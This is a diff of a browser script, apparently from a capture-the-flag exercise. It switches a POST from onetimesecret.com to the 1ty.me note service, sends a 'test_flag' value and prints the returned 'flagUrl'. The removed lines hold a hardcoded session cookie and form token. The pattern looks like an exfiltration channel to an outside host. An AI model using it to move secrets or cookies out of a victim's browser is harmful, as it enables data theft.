@@ -46,41 +46,45 @@ const postData = {
 
 console.log('Post Data:', postData);
 
-fetch('https://onetimesecret.com/', {
+const url = "https://1ty.me/?mode=ajax&cmd=create_note";
+
+const headers = new Headers();
+headers.append("Sec-Ch-Ua", "Not-A.Brand;v=99, Chromium;v=124");
+headers.append("Accept", "*/*");
+headers.append("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
+headers.append("X-Requested-With", "XMLHttpRequest");
+headers.append("Sec-Ch-Ua-Mobile", "?0");
+headers.append("Sec-Ch-Ua-Platform", "Windows");
+headers.append("Origin", "https://1ty.me");
+headers.append("Referer", "https://1ty.me/");
+headers.append("Priority", "u=h, i");
+headers.append("Connection", "keep-alive");
+
+const data = new URLSearchParams();
+data.append("note", "test_flag");
+data.append("email", "");
+data.append("reference", "");
+data.append("newsletter", "");
+data.append("expires_on", "undefined");
+
+fetch(url, {
   method: 'POST',
-  headers: {
-    'Cookie': 'sess=11e2kjlziegdr85vxud0mcqc1fel9vka7u26s3h2ywsii5re7nauloxuvksomwcpi1e0869m0iqbyalx4i1g4auxka0sh26carr8',
-    'Content-Type': 'application/x-www-form-urlencoded',
-    'Sec-Ch-Ua': '"Chromium";v="125", "Not.A/Brand";v="24"',
-    'Sec-Ch-Ua-Mobile': '?0',
-    'Sec-Ch-Ua-Platform': '"Windows"',
-    'Upgrade-Insecure-Requests': '1',
-    'Origin': 'null',
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36',
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'Sec-Fetch-Site': 'same-origin',
-    'Sec-Fetch-Mode': 'navigate',
-    'Sec-Fetch-User': '?1',
-    'Sec-Fetch-Dest': 'document',
-    'Accept-Encoding': 'gzip, deflate, br',
-    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
-    'Priority': 'u=0, i'
-  },
-  body: 'shrimp=hu0ul24xjj03k3gsz7pnx3mc873fbdbcpskkj71830pw3u9mftky7mbfytun9lwhhojx1ipqyipephl26heplaoexduisc3k9gw&secret=qqqqq&passphrase=&ttl=604800.0&kind=share',
-  mode: 'no-cors' // Режим no-cors для запроса без CORS
+  headers: headers,
+  body: data,
 })
-  .then(response => {
-    if (!response.ok) {
-      throw new Error('Network response was not ok');
-    }
-    return response.text();
-  })
-  .then(data => {
-    console.log(data);
-  })
-  .catch(error => {
-    console.error('Error:', error);
-  });
+.then(response => {
+  if (!response.ok) {
+    throw new Error('Network response was not ok');
+  }
+  return response.json();
+})
+.then(data => {
+  const flagUrl = "https://1ty.me/" + data.url;
+  console.log(flagUrl);
+})
+.catch(error => {
+  console.error('Error:', error);
+});
 
 
 </script>
